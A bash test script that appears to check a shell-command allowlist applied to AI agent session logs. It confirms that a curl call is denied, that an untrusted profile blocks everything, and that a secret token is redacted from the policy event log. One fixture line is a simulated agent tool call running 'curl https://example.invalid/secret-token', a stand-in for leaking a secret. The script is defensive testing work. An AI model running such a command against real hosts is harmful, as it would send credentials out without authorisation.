#!/usr/bin/env bash
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TMPDIR="$(mktemp -d)"
trap 'rm -rf "$TMPDIR"' EXIT

export LOG_DIR="$TMPDIR/logs"
export EVENT_LOG="$LOG_DIR/events.jsonl"
export AGENT_ID="shell-policy"
export ITERATION="1"
export AGENTMILL_RUN_ID="shell-policy-test"

# shellcheck source=../entrypoint-common.sh
. "$REPO_ROOT/entrypoint-common.sh"

allowed_log="$TMPDIR/allowed.jsonl"
cat > "$allowed_log" <<'JSONL'
{"type":"assistant","message":{"content":[{"type":"tool_use","id":"ok1","name":"Bash","input":{"command":"git status --short"}}]}}
{"type":"item.started","item":{"type":"command_execution","id":"ok2","command":"make test"}}
JSONL

AGENTMILL_PROFILE_LEVEL=standard \
AGENTMILL_SHELL_ALLOWLIST='git status:*,make test:*' \
enforce_shell_command_policy_from_session "$allowed_log"

denied_log="$TMPDIR/denied.jsonl"
cat > "$denied_log" <<'JSONL'
{"type":"assistant","message":{"content":[{"type":"tool_use","id":"bad1","name":"Bash","input":{"command":"curl https://example.invalid/secret-token"}}]}}
JSONL

set +e
AGENTMILL_PROFILE_LEVEL=standard \
AGENTMILL_SHELL_ALLOWLIST='git status:*' \
enforce_shell_command_policy_from_session "$denied_log"
denied_rc=$?
set -e
[[ "$denied_rc" -ne 0 ]] || { echo "expected shell command policy denial" >&2; exit 1; }

untrusted_log="$TMPDIR/untrusted.jsonl"
cat > "$untrusted_log" <<'JSONL'
{"type":"item.started","item":{"type":"command_execution","id":"bad2","command":"git status --short"}}
JSONL

set +e
AGENTMILL_PROFILE_LEVEL=untrusted \
AGENTMILL_SHELL_ALLOWLIST= \
enforce_shell_command_policy_from_session "$untrusted_log"
untrusted_rc=$?
set -e
[[ "$untrusted_rc" -ne 0 ]] || { echo "expected untrusted shell command denial" >&2; exit 1; }

python3 - "$EVENT_LOG" <<'PY'
import json
import sys

events = [json.loads(line) for line in open(sys.argv[1], encoding="utf-8")]
denied = [event for event in events if event["type"] == "policy.denied"]
assert len(denied) == 2, denied
first, second = [event["payload"] for event in denied]
assert first["reason"] == "shell_command_denied", first
assert first["argv0"] == "curl", first
assert first["matched_pattern"] == "curl:*", first
assert "secret-token" not in json.dumps(first), first
assert second["reason"] == "shell_command_denied", second
assert second["profile"] == "untrusted", second
assert second["matched_pattern"] == "*", second
PY

grep -q 'enforce_shell_command_policy_from_session "$SESSION_LOG"' "$REPO_ROOT/entrypoint.sh"

echo "PASS test_shell_policy"
